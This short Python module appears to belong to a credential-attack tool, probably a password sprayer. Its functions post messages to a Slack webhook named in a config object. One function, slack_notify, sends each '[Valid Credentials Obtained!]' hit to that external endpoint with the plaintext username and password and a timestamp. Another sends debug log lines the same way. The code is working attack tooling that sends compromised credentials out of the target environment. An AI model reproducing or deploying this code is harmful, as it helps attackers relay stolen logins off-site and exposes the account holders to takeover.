import requests, json
from datetime import datetime


def notify_success(username, password, notify_obj):

    type = notify_obj['type'].lower()
    webhook = notify_obj['webhook']

    if type == "slack":
        slack_notify(username, password, webhook)


def notify_update(message, notify_obj):

    type = notify_obj['type'].lower()
    webhook = notify_obj['webhook']

    if type == "slack":
        slack_update(message, webhook)


# Function for posting username/password to slack channel
def slack_notify(username, password, webhook):

    now = datetime.now()
    date=now.strftime("%d-%m-%Y")
    time=now.strftime("%H:%M:%S")

    text = ("```[Valid Credentials Obtained!]\n"
            f"User: {username}\n"
            f"Pass: {password}\n"
            f"Date: {date}\n"
            f"Time: {time}```")

    message = {
        "text" : text
    }

    response = requests.post(
        webhook, data=json.dumps(message),
        headers={'Content-Type': 'application/json'}
    )


# Function for debug messages
def slack_update(slacklog_msg, webhook):
    now = datetime.now()
    date=now.strftime("%d-%m-%Y")
    time=now.strftime("%H:%M:%S")

    text = ("```[Log Entry]\n"
            f"{slacklog_msg}\n"
            f"Date: {date}\n"
            f"Time: {time}```")

    message = {
        "text" : text
    }
    response = requests.post(
        webhook, data=json.dumps(message),
        headers={'Content-Type': 'application/json'}
    )
